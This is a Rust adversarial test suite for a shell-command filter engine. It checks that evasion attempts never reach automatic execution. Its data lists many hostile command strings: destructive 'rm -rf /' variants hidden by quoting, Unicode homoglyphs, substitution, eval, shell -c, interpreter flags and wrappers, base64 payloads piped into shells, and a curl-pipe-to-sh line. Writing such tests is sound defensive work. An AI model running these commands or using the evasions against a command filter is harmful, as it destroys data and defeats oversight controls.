//! Adversarial regression suite for the filter engine (issue #13, Spec 0002).
//!
//! One place that proves chaining and evasion attempts cannot slip past a
//! deny rule or the hard blacklist and never reach `AutoExec`. Grouped by
//! category: quoting, Unicode, nested substitution, shell `-c` / code
//! runners, whitespace, case, wrappers, chaining.
//!
//! The threat model for every case is the most permissive policy a user can
//! configure: an `Allow "*"` rule that would grant `AutoExec` to anything
//! not otherwise flagged. Each case is evaluated against three policies:
//!
//! 1. `Allow "*"` + `Deny "rm *"` — the denied command is reachable, so the
//!    result must be `Deny` or `Confirm`, never `AutoExec`;
//! 2. `Allow "*"` alone — only the hard blacklist and the parser stand
//!    between the input and `AutoExec`;
//! 3. no rules — the default fallback.
//!
//! Where the engine can actually see the denied command (chaining, wrappers,
//! `bash -c`, `eval`, substitution) the suite additionally asserts `Deny`.
//!
//! The older adversarial tests in `tests.rs` stay where they are and are not
//! changed (`test_chaining_cannot_bypass_blacklist`,
//! `test_ambiguous_quotes_never_autoexec`,
//! `test_nested_command_substitution_forces_confirm`, the ADR 0036 depth
//! tests, `test_t4_control_characters_rejected`,
//! `test_hard_blacklist_cannot_be_evaded_via_*`, ...). This suite extends
//! them; it does not replace them.

use async_trait::async_trait;

use super::*;

struct StaticPolicyStore {
    rules: Vec<Rule>,
}

#[async_trait]
impl PolicyStore for StaticPolicyStore {
    async fn rules_for(&self, scope: &EffectiveScope) -> Vec<Rule> {
        self.rules
            .iter()
            .filter(|rule| scope_applies(&rule.scope, scope))
            .cloned()
            .collect()
    }
}

fn rule(id: &str, glob: &str, action: RuleAction, priority: i32) -> Rule {
    Rule {
        id: RuleId(id.to_string()),
        pattern: Pattern::Glob(glob.to_string()),
        action,
        scope: Scope::Global,
        priority,
        origin: RuleOrigin::User,
    }
}

fn allow_all() -> Rule {
    rule("allow-all", "*", RuleAction::Allow, 100)
}

fn deny_rm() -> Rule {
    rule("deny-rm", "rm *", RuleAction::Deny, 0)
}

fn engine(rules: Vec<Rule>) -> FilterEngine<StaticPolicyStore> {
    FilterEngine::new(StaticPolicyStore { rules })
}

fn ctx() -> EvalContext {
    EvalContext {
        server_id: ServerId::new(),
        tags: Vec::new(),
    }
}

/// Asserts that `cmd` is never `AutoExec` under any of the three policies
/// from the module doc.
async fn assert_never_autoexec(cmd: &str) {
    let policies: [(&str, Vec<Rule>); 3] = [
        ("allow-all + deny-rm", vec![allow_all(), deny_rm()]),
        ("allow-all", vec![allow_all()]),
        ("no rules", vec![]),
    ];
    for (label, rules) in policies {
        let decision = engine(rules).evaluate(cmd, &ctx()).await;
        assert!(
            matches!(decision, Decision::Deny { .. } | Decision::Confirm { .. }),
            "{cmd:?} under policy [{label}]: expected Deny or Confirm, got {decision:?}"
        );
    }
}

/// Asserts that `cmd` is denied when a `Deny "rm *"` rule exists, even next
/// to an `Allow "*"` rule.
async fn assert_denied_by_rm_rule(cmd: &str) {
    let decision = engine(vec![allow_all(), deny_rm()])
        .evaluate(cmd, &ctx())
        .await;
    assert!(
        matches!(decision, Decision::Deny { .. }),
        "{cmd:?}: expected Deny via deny-rm, got {decision:?}"
    );
    assert_never_autoexec(cmd).await;
}

/// Asserts that a benign command stays `AutoExec` under `Allow "*"` — the
/// counter-check that the fail-closed rules do not block ordinary input.
async fn assert_benign_autoexec(cmd: &str) {
    let decision = engine(vec![allow_all(), deny_rm()])
        .evaluate(cmd, &ctx())
        .await;
    assert!(
        matches!(decision, Decision::AutoExec),
        "{cmd:?}: benign command must stay AutoExec, got {decision:?}"
    );
}

// --- Quoting ---------------------------------------------------------------

#[tokio::test]
async fn test_adv_quoting_plain_quotes_and_escapes_hit_deny_rule() {
    for cmd in [
        "\"rm\" -rf /",
        "'rm' -rf /",
        "r'm' -rf /",
        "r\"m\" -rf /",
        "r''m -rf /",
        "\\rm -rf /",
        "r\\m -rf /",
        "$'rm' -rf /",
        "$\"rm\" -rf /",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

/// ANSI-C quoting decodes escape sequences the engine does not decode
/// (`$'\x72m'` is `rm`). Fail closed: an ANSI-C string with a backslash
/// escape is never `AutoExec`, wherever it appears in the command.
#[tokio::test]
async fn test_adv_quoting_ansi_c_escapes_never_autoexec() {
    for cmd in [
        "$'\\x72m' -rf /",
        "$'\\x72\\x6d' -rf /",
        "$'\\162m' -rf /",
        "$'\\u0072m' -rf /",
        "$'r\\x6d' -rf /",
        "rm -rf $'\\x2f'",
        "ls; $'\\x72m' -rf /",
        "echo $'\\x72m -rf /'",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

#[tokio::test]
async fn test_adv_quoting_unbalanced_quotes_never_autoexec() {
    for cmd in ["rm -rf '/", "echo \"x; rm -rf /", "echo 'a' 'b"] {
        assert_never_autoexec(cmd).await;
    }
}

// --- Unicode ---------------------------------------------------------------

/// Bidi overrides, zero-width and other invisible format characters make the
/// displayed command differ from the executed one.
#[tokio::test]
async fn test_adv_unicode_invisible_and_bidi_characters_never_autoexec() {
    for cmd in [
        "rm -rf /\u{202E}",
        "ls \u{202E}/ fr- mr",
        "\u{202E}rm -rf /",
        "echo \u{202D}safe\u{202C}",
        "\u{2066}rm -rf /\u{2069}",
        "r\u{200B}m -rf /",
        "rm\u{200B} -rf /",
        "ls\u{200B}; rm -rf /",
        "r\u{200C}m -rf /",
        "r\u{200D}m -rf /",
        "\u{FEFF}rm -rf /",
        "r\u{00AD}m -rf /",
        "r\u{2060}m -rf /",
        "echo \u{200E}",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Unicode whitespace is a word separator for the engine's normalisation
/// but not for the shell — the engine would judge a different command than
/// the one that runs.
#[tokio::test]
async fn test_adv_unicode_whitespace_never_autoexec() {
    for cmd in [
        "rm\u{00A0}-rf /",
        "rm -rf\u{00A0}/",
        "ls\u{00A0}-la",
        "rm\u{2002}-rf /",
        "rm\u{2009}-rf /",
        "rm\u{202F}-rf /",
        "rm\u{205F}-rf /",
        "rm\u{3000}-rf /",
        "rm\u{1680}-rf /",
        "ls\u{2028}rm -rf /",
        "ls\u{2029}rm -rf /",
        "ls\u{0085}rm -rf /",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// C1 control characters (U+0080–U+009F) — the ASCII control check only
/// covered C0 and DEL.
#[tokio::test]
async fn test_adv_unicode_c1_controls_never_autoexec() {
    for cmd in [
        "rm -rf /\u{0080}",
        "ls\u{0085}-la",
        "echo \u{009B}31m",
        "rm\u{009F} -rf /",
        "\u{008D}rm -rf /",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Fullwidth forms and homoglyphs in the command word: the command name is
/// not plain ASCII, so the engine cannot tell what runs.
#[tokio::test]
async fn test_adv_unicode_fullwidth_and_homoglyph_command_words_never_autoexec() {
    for cmd in [
        "\u{FF52}\u{FF4D} -rf /",           // fullwidth "ｒｍ"
        "\u{FF52}\u{FF4D} \u{FF0D}rf /",    // fullwidth "ｒｍ －rf"
        "r\u{FF4D} -rf /",                  // mixed ASCII + fullwidth
        "ls; \u{FF52}\u{FF4D} -rf /",       // after chaining
        "r\u{043C} -rf /",                  // Cyrillic small em
        "\u{0433}m -rf /",                  // Cyrillic small ghe
        "\u{0455}udo rm -rf /",             // Cyrillic dze as "s" in sudo
        "\u{0440}m -rf /",                  // Cyrillic er as "p"-lookalike
        "r\u{217F} -rf /",                  // Roman numeral one thousand "ⅿ"
        "env \u{FF52}\u{FF4D} -rf /",       // behind a wrapper
        "echo $(\u{FF52}\u{FF4D} -rf /)",   // inside a substitution
        "bash -c '\u{FF52}\u{FF4D} -rf /'", // inside shell -c
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Counter-check: non-ASCII text in arguments stays usable.
#[tokio::test]
async fn test_adv_unicode_in_arguments_stays_autoexec() {
    for cmd in [
        "echo \"Grüße aus Köln\"",
        "ls -la /srv/données",
        "grep -r 'naïve' .",
        "echo 日本語",
    ] {
        assert_benign_autoexec(cmd).await;
    }
}

// --- Nested substitution ---------------------------------------------------

#[tokio::test]
async fn test_adv_nested_substitution_hits_deny_rule() {
    for cmd in [
        "echo $(rm -rf /)",
        "echo `rm -rf /`",
        "echo $(echo $(rm -rf /))",
        "echo $(echo `rm -rf /`)",
        "cat <(rm -rf /)",
        "tee >(rm -rf /)",
        "echo \"$(rm -rf /)\"",
        "ls $(true; rm -rf /)",
        "ls $(true && sudo rm -rf /)",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

#[tokio::test]
async fn test_adv_substitution_as_command_word_never_autoexec() {
    for cmd in [
        "$(echo rm) -rf /",
        "`echo rm` -rf /",
        "$(printf '\\x72m') -rf /",
        "$(echo cm0= | base64 -d) -rf /",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

// --- Shell -c and other code runners -----------------------------------------

#[tokio::test]
async fn test_adv_shell_c_hits_deny_rule() {
    for cmd in [
        "bash -c \"rm -rf /\"",
        "sh -c 'rm -rf /'",
        "zsh -c 'rm -rf /'",
        "dash -c 'rm -rf /'",
        "bash -xc 'rm -rf /'",
        "sudo bash -c 'rm -rf /'",
        "env bash -c 'rm -rf /'",
        "/bin/bash -c 'rm -rf /'",
        "bash -c 'ls; rm -rf /'",
        "bash -c \"bash -c 'rm -rf /'\"",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

#[tokio::test]
async fn test_adv_interpreter_code_flags_never_autoexec() {
    for cmd in [
        "python3 -c \"import os; os.system('rm -rf /')\"",
        "perl -e 'system(\"rm -rf /\")'",
        "ruby -e '`rm -rf /`'",
        "node -e \"require('child_process').execSync('rm -rf /')\"",
        "php -r 'system(\"rm -rf /\");'",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// `eval` runs its (concatenated) arguments as shell code — the same
/// evasion class as `bash -c`.
#[tokio::test]
async fn test_adv_eval_hits_deny_rule() {
    for cmd in [
        "eval \"rm -rf /\"",
        "eval 'rm -rf /'",
        "eval rm -rf /",
        "eval \"ls; rm -rf /\"",
        "sudo eval 'rm -rf /'",
        "ls && eval \"rm -rf /\"",
        "eval \"eval 'rm -rf /'\"",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

#[tokio::test]
async fn test_adv_eval_never_autoexec() {
    for cmd in [
        "eval \"$x\"",
        "eval ls",
        "eval \"$(echo cm0gLXJmIC8= | base64 -d)\"",
        "EVAL 'rm -rf /'",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Here-strings and here-docs feed code to a shell on stdin.
#[tokio::test]
async fn test_adv_here_strings_and_heredocs_never_autoexec() {
    for cmd in [
        "bash <<< \"rm -rf /\"",
        "sh <<< 'rm -rf /'",
        "bash<<<'rm -rf /'",
        "cat <<< x | sh",
        "bash <<EOF\nrm -rf /\nEOF",
        "sh <<-'EOF'\nrm -rf /\nEOF",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Every shell with a `-c`-style code argument, not only bash/sh/zsh/dash,
/// and `-c` in a later chain segment or behind other options: the code is
/// evaluated as a command of its own, so the `Deny` rule still applies.
#[tokio::test]
async fn test_adv_shell_c_other_shells_and_positions_hit_deny_rule() {
    for cmd in [
        "ksh -c 'rm -rf /'",
        "mksh -c 'rm -rf /'",
        "ash -c 'rm -rf /'",
        "yash -c 'rm -rf /'",
        "csh -c 'rm -rf /'",
        "tcsh -c 'rm -rf /'",
        "fish -c 'rm -rf /'",
        "fish --command 'rm -rf /'",
        "fish --command='rm -rf /'",
        "busybox ash -c 'rm -rf /'",
        "/bin/mksh -c 'rm -rf /'",
        "KSH -c 'rm -rf /'",
        "bash -e -c 'rm -rf /'",
        "bash -o errexit -c 'rm -rf /'",
        "bash +o history -c 'rm -rf /'",
        "bash --norc -c 'rm -rf /'",
        "bash --rcfile /dev/null -c 'rm -rf /'",
        "sh -c -- 'rm -rf /'",
        "ls; bash -c 'rm -rf /'",
        "ls && ksh -c 'rm -rf /'",
        "ls | sudo bash -e -c 'rm -rf /'",
        // `-o`/`-O` inside a cluster take the next word; the shell keeps
        // reading the cluster, so `c` still applies (review of PR #46).
        "bash -oc errexit 'rm -rf /'",
        "ls; bash -oc errexit 'rm -rf /'",
        "ls; bash -Oc extglob 'rm -rf /'",
        "ls && dash -oc errexit 'rm -rf /'",
        "ls; bash -eoc errexit 'rm -rf /'",
        // zsh and the ksh family take an attached `-o` value instead, so
        // `-c` after `-oerrexit` is still the code flag (review of PR #46).
        "ls; zsh -oerrexit -c 'rm -rf /'",
        "ls; ksh -oerrexit -c 'rm -rf /'",
        "ls; mksh -oerrexit -c 'rm -rf /'",
        "ls; zsh +oerrexit -c 'rm -rf /'",
        "ls; zsh -o errexit -c 'rm -rf /'",
        // `sh` may be either kind of shell: both readings are checked.
        "ls; sh -oerrexit -c 'rm -rf /'",
        "ls; sh -oc errexit 'rm -rf /'",
        "ls; yash -oerrexit -c 'rm -rf /'",
        // ksh93 reads a one-letter `-o` value as that short option, so
        // `-oc` / `-o c` mean `-c` (review of PR #46).
        "ksh -oc 'rm -rf /'",
        "ls; ksh -oc 'rm -rf /'",
        "ls; ksh -o c 'rm -rf /'",
        "ls; ksh93 -o c 'rm -rf /'",
        "ls; mksh -oc 'rm -rf /'",
        "ls; ksh -xoc 'rm -rf /'",
        "ls; sh -o c 'rm -rf /'",
        "ls; sh -oc 'rm -rf /'",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

/// Interpreter code flags behind other options or in a later segment.
#[tokio::test]
async fn test_adv_interpreter_code_flags_after_options_never_autoexec() {
    for cmd in [
        "python3 -W ignore -c \"import os; os.system('rm -rf /')\"",
        "python3 -X utf8 -c 'import os'",
        "python3.12 -c 'import os'",
        "ls && python3 -c 'import os'",
        "ls; perl -w -e 'system(\"rm -rf /\")'",
        "ls; ruby -r json -e '`rm -rf /`'",
        "ls; node --eval \"require('child_process').execSync('rm -rf /')\"",
        "ls; php -d x=1 -r 'system(\"rm -rf /\");'",
        // Options with a digits-only or open-ended attached value inside a
        // cluster must not hide a later code flag (review of PR #46).
        "perl -le 'system \"rm -rf /\"'",
        "ls; perl -le 'system \"rm -rf /\"'",
        "ls; perl -lne 'system \"rm -rf /\"'",
        "ls; perl -l0e 'system \"rm -rf /\"'",
        "ls; perl -0e 'system \"rm -rf /\"'",
        "ls; perl -0777e 'system \"rm -rf /\"'",
        "ls; perl -0xffe 'system \"rm -rf /\"'",
        "ls; perl -Mstrict,e 'system \"rm -rf /\"'",
        "ls; ruby -We '`rm -rf /`'",
        "ls; ruby -W2e '`rm -rf /`'",
        "ls; ruby -0e '`rm -rf /`'",
        "ls; ruby -Kue '`rm -rf /`'",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Option values and `+` options must not pass for a script operand, and
/// `source`/`.` of stdin runs piped code too (review of PR #46).
#[tokio::test]
async fn test_adv_piping_into_a_shell_with_options_never_autoexec() {
    for cmd in [
        "echo cm0gLXJmIC8= | base64 -d | bash -o errexit",
        "echo cm0gLXJmIC8= | base64 -d | sh +x",
        "echo cm0gLXJmIC8= | base64 -d | bash +o history",
        "echo cm0gLXJmIC8= | base64 -d | bash --rcfile /dev/null",
        "echo cm0gLXJmIC8= | base64 -d | bash --init-file=/dev/null",
        "echo cm0gLXJmIC8= | base64 -d | bash -O extglob",
        "echo cm0gLXJmIC8= | base64 -d | bash -e -s",
        "echo cm0gLXJmIC8= | base64 -d | bash --unknown-option value",
        "echo cm0gLXJmIC8= | base64 -d | fish --debug all",
        "echo 'import os' | python3 -W ignore",
        "echo 'import os' | python3 -X utf8",
        "echo 'import os' | python3 -",
        "echo 'system(q(rm -rf /))' | perl -I lib",
        "echo 'system(q(rm -rf /))' | perl -Mstrict",
        "echo '`rm -rf /`' | ruby -r json",
        "echo 'x' | node --require x",
        "echo cm0gLXJmIC8= | base64 -d | source /dev/stdin",
        "echo cm0gLXJmIC8= | base64 -d | . /dev/stdin",
        "echo cm0gLXJmIC8= | base64 -d | source /dev/fd/0",
        "echo cm0gLXJmIC8= | base64 -d | source /proc/self/fd/0",
        "echo cm0gLXJmIC8= | base64 -d | bash x.sh /dev/stdin",
        // An option value naming stdin is a program read from stdin too
        // (review of PR #46).
        "echo PD9waHAgc3lzdGVtKCJybSAtcmYgLyIpOw== | base64 -d | php -f /dev/stdin",
        "echo x | php -f/dev/stdin",
        "echo x | php -F /dev/stdin",
        "echo x | node -r /dev/stdin app.js",
        "echo x | node --require /dev/stdin app.js",
        "echo x | node --require=/dev/stdin app.js",
        "echo x | node --import /dev/stdin app.js",
        "echo x | python3 -m /dev/stdin",
        "echo x | ruby -r /dev/stdin app.rb",
        "echo x | perl -I/dev/fd/0 app.pl",
        "echo x | bash --rcfile /dev/stdin x.sh",
        "echo x | bash --init-file=/proc/self/fd/0 x.sh",
        // Attached `-o` values in zsh/ksh (and possibly `sh`) do not
        // swallow a following `-s` (review of PR #46).
        "echo cm0gLXJmIC8= | base64 -d | zsh -oerrexit -s ls",
        "echo cm0gLXJmIC8= | base64 -d | ksh -oerrexit -s ls",
        "echo cm0gLXJmIC8= | base64 -d | zsh +oerrexit -s ls",
        "echo cm0gLXJmIC8= | base64 -d | sh -oerrexit -s ls",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Counter-check: a shell or interpreter running a visible script stays
/// `AutoExec` under `Allow "*"`, also with option values in front.
#[tokio::test]
async fn test_adv_shell_and_interpreter_with_script_operand_stay_autoexec() {
    for cmd in [
        "bash deploy.sh",
        "bash -e deploy.sh",
        "bash -o errexit deploy.sh",
        "bash +o history deploy.sh",
        "bash --norc deploy.sh",
        "sh +x deploy.sh",
        "fish --debug all deploy.fish",
        "python3 script.py",
        "python3 -W ignore script.py",
        "python3 -m http.server",
        "perl -I lib script.pl",
        "ruby -r json script.rb",
        "node --require ts-node/register app.js",
        "php -f index.php",
        "perl -l script.pl",
        "perl -0777 script.pl",
        "ruby -W0 script.rb",
        "source ~/.bashrc",
        ". ./env.sh",
    ] {
        assert_benign_autoexec(cmd).await;
    }
}

#[test]
fn test_adv_program_source_parses_options_per_program() {
    use super::parser::{program_source, ProgramSource};
    let code = |c: &str| Some(ProgramSource::Code(vec![c.to_string()]));
    assert_eq!(
        program_source("bash -o errexit -c 'rm -rf /'"),
        code("rm -rf /")
    );
    assert_eq!(program_source("bash -xc 'rm -rf /' arg0"), code("rm -rf /"));
    assert_eq!(program_source("fish -c 'rm -rf /'"), code("rm -rf /"));
    assert_eq!(program_source("python3 -c'import os'"), code("import os"));
    assert_eq!(
        program_source("bash -o errexit"),
        Some(ProgramSource::Stdin)
    );
    assert_eq!(program_source("sh +x"), Some(ProgramSource::Stdin));
    assert_eq!(program_source("bash -"), Some(ProgramSource::Stdin));
    assert_eq!(program_source("bash -s x.sh"), Some(ProgramSource::Stdin));
    assert_eq!(
        program_source("source /dev/stdin"),
        Some(ProgramSource::Stdin)
    );
    assert_eq!(
        program_source("bash -o errexit x.sh"),
        Some(ProgramSource::Operand)
    );
    assert_eq!(
        program_source("python3 -m venv .venv"),
        Some(ProgramSource::Operand)
    );
    assert_eq!(
        program_source("bash --frobnicate x.sh"),
        Some(ProgramSource::Opaque)
    );
    assert_eq!(program_source("bash -c"), Some(ProgramSource::Opaque));
    assert_eq!(program_source("ls -la"), None);
    // Value options inside a cluster (review of PR #46).
    assert_eq!(
        program_source("bash -oc errexit 'rm -rf /'"),
        code("rm -rf /")
    );
    assert_eq!(program_source("perl -le 'x'"), code("x"));
    assert_eq!(program_source("perl -l0e 'x'"), code("x"));
    assert_eq!(program_source("ruby -W2e 'x'"), code("x"));
    assert_eq!(
        program_source("perl -0x1ff x.pl"),
        Some(ProgramSource::Opaque)
    );
    assert_eq!(
        program_source("perl -Mlib=e x.pl"),
        Some(ProgramSource::Opaque)
    );
    assert_eq!(
        program_source("perl -Mstrict x.pl"),
        Some(ProgramSource::Operand)
    );
    assert_eq!(
        program_source("perl -0777 x.pl"),
        Some(ProgramSource::Operand)
    );
    // Option values naming stdin.
    assert_eq!(
        program_source("php -f /dev/stdin"),
        Some(ProgramSource::Stdin)
    );
    assert_eq!(
        program_source("node --require=/dev/stdin app.js"),
        Some(ProgramSource::Stdin)
    );
    // `-o` value: next word in bash/dash, attached in zsh/ksh; `sh` is
    // read both ways and merged (review of PR #46).
    assert_eq!(
        program_source("zsh -oerrexit -c 'rm -rf /'"),
        code("rm -rf /")
    );
    assert_eq!(
        program_source("ksh -o errexit -c 'rm -rf /'"),
        code("rm -rf /")
    );
    assert_eq!(
        program_source("zsh -oerrexit -s ls"),
        Some(ProgramSource::Stdin)
    );
    assert_eq!(
        program_source("dash -oc errexit 'rm -rf /'"),
        code("rm -rf /")
    );
    assert_eq!(
        program_source("sh -oerrexit -c 'rm -rf /'"),
        code("rm -rf /")
    );
    // bash/dash reading: `-o` takes `errexit`, code is `rm -rf /`; ksh93
    // reading: `-oc` is `-c`, code is `errexit`. Both are evaluated.
    assert_eq!(
        program_source("sh -oc errexit 'rm -rf /'"),
        Some(ProgramSource::Code(vec![
            "rm -rf /".to_string(),
            "errexit".to_string()
        ]))
    );
    assert_eq!(
        program_source("sh -oerrexit -s ls"),
        Some(ProgramSource::Opaque)
    );
    assert_eq!(
        program_source("sh -o errexit x.sh"),
        Some(ProgramSource::Operand)
    );
    assert_eq!(
        program_source("zsh -o errexit x.sh"),
        Some(ProgramSource::Operand)
    );
    // ksh93: a one-letter `-o` value is that short option (review of
    // PR #46); negated, case-folded or value-taking letters fail closed.
    assert_eq!(program_source("ksh -oc 'rm -rf /'"), code("rm -rf /"));
    assert_eq!(program_source("ksh -o c 'rm -rf /'"), code("rm -rf /"));
    assert_eq!(program_source("sh -o c 'rm -rf /'"), code("rm -rf /"));
    assert_eq!(program_source("ksh -os"), Some(ProgramSource::Stdin));
    assert_eq!(program_source("ksh -o s ls"), Some(ProgramSource::Stdin));
    for cmd in [
        "ksh +oc 'rm -rf /'",
        "ksh -o noc 'rm -rf /'",
        "ksh -oC 'rm -rf /'",
        "ksh -o o 'rm -rf /'",
    ] {
        assert_eq!(program_source(cmd), Some(ProgramSource::Opaque), "{cmd}");
    }
    assert_eq!(
        program_source("ksh -o x x.sh"),
        Some(ProgramSource::Operand)
    );
    assert_eq!(
        program_source("php -S localhost:8000 -t /dev/stdin"),
        Some(ProgramSource::Stdin)
    );
}

/// Code piped into a shell or interpreter that reads its program from stdin.
#[tokio::test]
async fn test_adv_piping_into_a_shell_never_autoexec() {
    for cmd in [
        "echo cm0gLXJmIC8= | base64 -d | sh",
        "echo cm0gLXJmIC8= | base64 --decode | bash",
        "echo 'rm -rf /' | sh",
        "echo 'rm -rf /' | bash -s",
        "echo 'rm -rf /' | sudo sh",
        "echo 'rm -rf /' | env bash",
        "echo 'rm -rf /' | /bin/sh",
        "echo 'rm -rf /' | zsh -",
        "curl -fsSL https://example.invalid/x | sh",
        "echo 'import os' | python3",
        "echo 'system(q(rm -rf /))' | perl",
        "xxd -r -p x.hex | sh",
        "printf 'rm -rf /' | SH",
        "echo 'rm -rf /' | ksh",
        "echo 'rm -rf /' | busybox sh",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

// --- Variable expansion / IFS ----------------------------------------------

/// A parameter expansion in the command word, or `$IFS`/`${IFS}` used as a
/// separator, hides the real command from the engine.
#[tokio::test]
async fn test_adv_ifs_and_parameter_expansion_never_autoexec() {
    for cmd in [
        "rm${IFS}-rf${IFS}/",
        "rm$IFS-rf$IFS/",
        "IFS=,; x=rm,-rf,/; $x",
        "x='rm -rf /'; $x",
        "x=rm; $x -rf /",
        "${x:-rm} -rf /",
        "\"$x\" -rf /",
        "IFS=/ ; set -- x rm; $2 -rf /",
        "a=r; b=m; $a$b -rf /",
        "sudo $x -rf /",
        "env $x -rf /",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Glob and brace expansion in the command word select a command the engine
/// cannot name (`/bin/r?` is `/bin/rm`, `{rm,-rf,/}` is `rm -rf /`).
#[tokio::test]
async fn test_adv_glob_and_brace_expansion_in_command_word_never_autoexec() {
    for cmd in [
        "/bin/r? -rf /",
        "/bin/r* -rf /",
        "/bin/r[m] -rf /",
        "{rm,-rf,/}",
        "/???/?m -rf /",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Counter-check: expansions in arguments keep working.
#[tokio::test]
async fn test_adv_expansion_in_arguments_stays_autoexec() {
    for cmd in [
        "echo $HOME",
        "ls -la ${HOME}/logs",
        "ls *.log",
        "cat /var/log/syslog",
    ] {
        assert_benign_autoexec(cmd).await;
    }
}

// --- Whitespace --------------------------------------------------------------

#[tokio::test]
async fn test_adv_whitespace_separators_hit_deny_rule() {
    for cmd in [
        "ls\rrm -rf /",
        "ls\r\nrm -rf /",
        "ls\nrm -rf /",
        "rm\t-rf\t/",
        "\trm -rf /",
        "rm \t -rf  \t /",
        "ls ;\trm -rf /",
        "ls\t&&\trm -rf /",
        "  rm   -rf   /  ",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

#[tokio::test]
async fn test_adv_whitespace_vertical_tab_and_form_feed_never_autoexec() {
    for cmd in [
        "rm\x0b-rf /",
        "ls\x0brm -rf /",
        "rm\x0c-rf /",
        "ls\x0crm -rf /",
        "ls \x0b; rm -rf /",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

#[tokio::test]
async fn test_adv_whitespace_mixed_tabs_stay_autoexec_for_benign_input() {
    for cmd in ["ls\t-la", "ls \t -la", "\tls -la\t"] {
        assert_benign_autoexec(cmd).await;
    }
}

// --- Case ------------------------------------------------------------------

#[tokio::test]
async fn test_adv_case_variants_of_the_command_never_autoexec() {
    for cmd in [
        "RM -rf /",
        "Rm -Rf /",
        "rM -fR /",
        "/BIN/RM -rf /",
        "ls; RM -RF /",
    ] {
        assert_never_autoexec(cmd).await;
    }
}

/// Mixed case on wrappers and shells (relevant on case-insensitive file
/// systems, where `ENV` resolves to `env`).
#[tokio::test]
async fn test_adv_case_variants_on_wrappers_hit_deny_rule() {
    for cmd in [
        "SUDO rm -rf /",
        "Sudo rm -rf /",
        "ENV rm -rf /",
        "Env rm -rf /",
        "NoHup rm -rf /",
        "TIMEOUT 5 rm -rf /",
        "XARGS rm -rf /",
        "sUdO -u root rm -rf /",
        "ls; Env rm -rf /",
        "BASH -c 'rm -rf /'",
        "Sh -c 'rm -rf /'",
        "Eval 'rm -rf /'",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

// --- Wrappers --------------------------------------------------------------

#[tokio::test]
async fn test_adv_wrappers_hit_deny_rule() {
    for cmd in [
        "env rm -rf /",
        "env -i rm -rf /",
        "env FOO=1 rm -rf /",
        "nice -n 10 rm -rf /",
        "nohup rm -rf /",
        "time rm -rf /",
        "command rm -rf /",
        "timeout 5 rm -rf /",
        "xargs rm -rf /",
        "setsid rm -rf /",
        "stdbuf -oL rm -rf /",
        "ionice -c3 rm -rf /",
        "chroot /mnt rm -rf /",
        "flock /tmp/lock rm -rf /",
        "busybox rm -rf /",
        "sudo rm -rf /",
        "sudo -u root rm -rf /",
        "doas rm -rf /",
        "sudo sudo env nice rm -rf /",
        "FOO=1 rm -rf /",
        "/usr/bin/env rm -rf /",
        "/bin/rm -rf /",
        "./rm -rf /",
        "exec rm -rf /",
        "builtin exec rm -rf /",
        "echo / | xargs rm -rf",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

// --- Chaining --------------------------------------------------------------

#[tokio::test]
async fn test_adv_chaining_hits_deny_rule() {
    for cmd in [
        "ls; rm -rf /",
        "ls && rm -rf /",
        "ls || rm -rf /",
        "ls | rm -rf /",
        "ls & rm -rf /",
        "ls;rm -rf /",
        "ls&&rm -rf /",
        "ls |& rm -rf /",
        "true; false || ls && rm -rf /",
    ] {
        assert_denied_by_rm_rule(cmd).await;
    }
}

/// Shell grammar around a command (subshells, groups, negation, compound
/// keywords) must not hide it from a deny rule.
#[tokio::test]
async fn test_adv_compound_syntax_never_autoexec() {
    for cmd in [
        "(rm -rf /)",
        "( rm -rf / )",
        "{ rm -rf /; }",
        "! rm -rf /",
        "if true; then rm -rf /; fi",
        "while true; do rm -rf /; done",
        "for f in /; do rm -rf $f; done",
        "until false; do rm -rf /; done",
        "if false; then :; else rm -rf /; fi",
        "case x in x) rm -rf /;; esac",
    ] {
        assert_never_autoexec(cmd).await;
    }
}
